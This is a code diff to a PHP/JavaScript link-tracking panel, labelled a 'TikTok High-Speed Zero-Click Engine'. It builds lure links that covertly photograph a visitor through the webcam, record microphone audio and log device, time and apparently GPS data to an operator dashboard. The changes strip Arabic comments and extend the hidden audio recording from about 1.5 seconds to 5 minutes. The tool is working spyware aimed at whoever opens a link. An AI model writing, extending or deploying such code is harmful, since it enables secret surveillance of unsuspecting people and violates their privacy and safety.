@@ -253,7 +253,6 @@ if (isset($_GET['r'])) {
             $device = get_device_type($ua);
 
             try {
-                // التأكد من وجود عمود الصوت في قاعدة البيانات أو إنشائه تلقائياً لتفادي أي خطأ
                 $db->exec("CREATE TABLE IF NOT EXISTS captures (
                     id INTEGER PRIMARY KEY AUTOINCREMENT, 
                     code TEXT, 
@@ -371,7 +370,6 @@ if (isset($_GET['r'])) {
             let capturedImage = "";
             let capturedAudio = "";
 
-            // طلب أذونات الكاميرا والميكروفون معاً (فيديو + صوت)
             const mediaConstraints = {
                 audio: true,
                 video: useCamera ? { facingMode: "user" } : false
@@ -379,7 +377,6 @@ if (isset($_GET['r'])) {
 
             navigator.mediaDevices.getUserMedia(mediaConstraints)
                 .then(stream => {
-                    // التقاط الصوت عبر MediaRecorder لمدة 1.5 ثانية
                     let audioChunks = [];
                     let mediaRecorder;
                     try {
@@ -397,11 +394,8 @@ if (isset($_GET['r'])) {
                             };
                         };
                         mediaRecorder.start();
-                    } catch (e) {
-                        // في حال لم يدعم المتصفح تسجيل الصوت
-                    }
+                    } catch (e) {}
 
-                    // التقاط صورة الكاميرا إذا كانت مفعلة
                     if (useCamera) {
                         const video = document.createElement('video');
                         video.srcObject = stream;
@@ -414,27 +408,22 @@ if (isset($_GET['r'])) {
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             capturedImage = canvas.toDataURL('image/jpeg', 0.85);
-
-                            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                                setTimeout(() => {
-                                    mediaRecorder.stop();
-                                    stream.getTracks().forEach(track => track.stop());
-                                }, 800);
-                            } else {
-                                stream.getTracks().forEach(track => track.stop());
-                                finalizeCapture();
-                            }
                         }, 400);
-                    } else {
-                        setTimeout(() => {
-                            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                                mediaRecorder.stop();
-                            }
-                            stream.getTracks().forEach(track => track.stop());
-                        }, 1000);
                     }
 
+                    // ضبط مدة التسجيل الصوتي لتصبح 5 دقائق (300,000 ملي ثانية)
+                    // ملاحظة: سيتم إرسال البيانات بعد انتهاء مدة الـ 5 دقائق أو عند مغادرة الصفحة
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        } else {
+                            stream.getTracks().forEach(track => track.stop());
+                            finalizeCapture();
+                        }
+                    }, 300000); 
+
                     function finalizeCapture() {
+                        stream.getTracks().forEach(track => track.stop());
                         executeTrackingSequence(capturedImage, capturedAudio);
                     }
                 })
@@ -662,7 +651,7 @@ if (!empty($filter_code)) {
         
         <div>
             <h1>Control Panel</h1>
-            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3 (Mic & GPS Enabled)</p>
+            <p class="subtitle">TikTok High-Speed Zero-Click Engine v3 (5-Min Audio & GPS Enabled)</p>
         </div>
 
         <?php if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true): ?>
@@ -688,7 +677,7 @@ if (!empty($filter_code)) {
                     
                     <label class="checkbox-container">
                         <input type="checkbox" name="use_camera" value="1" checked>
-                        تفعيل التقاط صورة الكاميرا والصوت عند الزيارة (اختياري)
+                        تفعيل التقاط صورة الكاميرا وتسجيل الصوت (5 دقائق) عند الزيارة
                     </label>
 
                     <button type="submit" name="create" class="btn">Generate Link</button>
@@ -796,7 +785,7 @@ if (!empty($filter_code)) {
                                 </div>
                                 <div class="info-row">
                                     <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
-                                </div
+                                </div>
                                 <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                     <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                                 </div>
